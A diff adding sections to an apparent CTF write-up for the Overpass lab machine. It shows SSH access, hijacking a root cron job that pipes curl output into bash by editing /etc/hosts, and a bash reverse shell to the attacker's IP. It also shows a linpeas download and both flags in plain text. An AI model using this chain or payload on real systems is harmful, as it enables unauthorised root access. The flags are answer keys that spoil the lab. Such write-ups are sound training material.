@@ -144,12 +144,20 @@ Session completed.
 > We see the password is `james13`.
 > From the website, we see the username `James` alot. So using that username, the password we cracked, and the private ssh key, we can login via ssh to the machine.
 
+> First, we need to change permissions for the `id_rsa` for it work.
+
+```shell
+chmod 600 id_rsa
+```
+
+> Then we can connect.
+
 ```
 ssh -i id_rsa James@10.10.144.126
 ```
 
 > Doesn't work.
-> Trying the username without the capital letter.
+> Trying the username without the capital letter and passowrd `james13`.
 
 ```
 ssh -i id_rsa james@10.10.144.126
@@ -162,4 +170,152 @@ ssh -i id_rsa james@10.10.144.126
 > We see the first flag.
 ###### Hack the machine and get the flag in user.txt : `thm{65c1aaf000506e56996822c6281e6bf7}`
 
-> 
+> The next step is to try and become root user.
+> Need to find a way to escalate privileges.
+> In the `todo.txt` it said something about an automated script, so lets check out `/etc/crontab`.
+
+```
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+# Update builds from latest code
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+
+```
+
+> We see in the last line, that every minute, this script called `buildscript` is run with root privileges.
+> It gets that script by accessing the machines domain, and then going to the folder `/downloads/src` and then gets the script `buildscript.sh`.
+> If we can modify the way the name `overpass.thm` resolves by changing the IP address it resolves to our machine's IP address, we can then create the directory `/downloads/src` and create our own script `buildscript.sh` that will run with root privileges.
+
+> To do that, we need to access the `/etc/hosts` file and be able to modify it.
+```
+nano /etc/hosts
+```
+> Works, meaning we have write access.
+
+![](./screenshots/nano.png)
+
+> We need to change the IP address that `overpass.thm` resolves to, and make it our own IP address.
+> To get our machine's IP address, we do `ifconfig`.
+
+![](./screenshots/ifconfig.png)
+
+> Therefore, our IP address is `10.18.5.150`.
+> Changing the `/etc/hosts` file.
+
+![](./screenshots/nano-1.png)
+
+> Next, we need to create the path `/downloads/src` in our machine.
+
+```
+mkdir -p downloads/src
+```
+
+> Whats remaining is to create the `buildscript.sh` file.
+> This file is going to contain a reverse shell script so that we get access to the target machine as root. This is the case since the cronjob is run as root.
+
+> Inside `/downloads/src`, create a file called `buildscript.sh`.
+```
+nano buildscript.sh
+```
+
+> And inside it paste this code for the reverse shell.
+
+```
+#!/bin/bash
+bash -i >& /dev/tcp/10.18.5.150/4444 0>&1
+```
+> Where the IP is the IP of our attacking machine, and 4444 is an open port.
+> Make this shell executable.
+
+```
+chmod +x buildscript.sh
+```
+
+> Now, we need to start a server, such that the domain `overpass.thm` that now resolves to our IP address is available to be reached.
+> However, we need to be located in the directory right before `downloads/src`. This is because the cronjob goes into `/downloads/src/buildscript.sh`.
+
+```shell
+python3 -m http.server 80 
+```
+
+> At the same time, we open another tab, and create a listener that will listen for the reverse shell connection.
+> Do that via netcat, with the same port as the one inside the `buildscript.sh`.
+
+```
+nc -nlvp 4444
+```
+
+> After a minute, we see on the server a `GET` request fetching the script.
+
+![](./screenshots/shell.png)
+
+> And on the listener, we see a connection.
+
+``` shell
+└─$ nc -nlvp 4444 
+listening on [any] 4444 ...
+connect to [10.18.5.150] from (UNKNOWN) [10.10.144.211] 33248
+bash: cannot set terminal process group (1409): Inappropriate ioctl for device
+bash: no job control in this shell
+root@overpass-prod:~# ls
+ls
+buildStatus
+builds
+go
+root.txt
+src
+root@overpass-prod:~# cat root.txt
+cat root.txt
+thm{7f336f8c359dbac18d54fdd64ea753bb}
+root@overpass-prod:~# 
+
+```
+
+> We are inside as the root user, and we see the flag.
+
+###### Escalate your privileges and get the flag in root.txt : `thm{7f336f8c359dbac18d54fdd64ea753bb}`
+
+---
+
+#### Note
+
+> To escalate priviliges, i found the cronjob by luck.
+> The correct technique would have been to run an automated tool such as linpeas.
+
+> To do that, download the linpeas.sh script on the attacking machine and start a python server.
+
+``` shell
+python3 -m http.server 80
+```
+
+> Then on the target machine, use `wget` to download it.
+
+``` shell
+wget http://<my-machine-ip>:80/linpeas.sh
+```
+
+> Once it downloads, set it to be executable.
+
+``` shell
+chmod +x linpeas.sh
+```
+
+> Finally, run it and complete the task.
+
+``` shell
+./linpeas.sh
+```
+
+---
